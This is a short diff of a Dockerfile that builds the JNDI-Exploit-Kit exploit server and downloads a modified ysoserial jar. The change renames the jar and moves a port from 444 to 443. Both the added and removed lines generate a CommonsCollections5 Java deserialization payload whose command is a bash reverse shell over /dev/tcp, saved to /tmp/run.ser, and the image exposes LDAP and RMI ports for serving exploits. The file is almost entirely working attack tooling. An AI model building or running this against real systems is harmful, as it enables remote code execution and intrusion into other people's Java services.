@@ -8,8 +8,8 @@ RUN git clone https://github.com/pimps/JNDI-Exploit-Kit \
     && mvn -f /usr/src/app/pom.xml clean package -DskipTests
 
 FROM openjdk:8-alpine
-RUN wget -q https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-0.0.5-SNAPSHOT.jar \
-    && java -jar ysoserial-0.0.5-SNAPSHOT.jar CommonsCollections5 bash '/bin/bash -i >& /dev/tcp/127.0.0.1/444 0>&1' > /tmp/run.ser
+RUN wget -q https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-modified.jar \
+    && java -jar ysoserial-modified.jar CommonsCollections5 bash '/bin/bash -i >& /dev/tcp/127.0.0.1/443 0>&1' > /tmp/run.ser
 COPY --from=builder /usr/src/app/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar /usr/app/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
 
 EXPOSE 1389 9090 1099
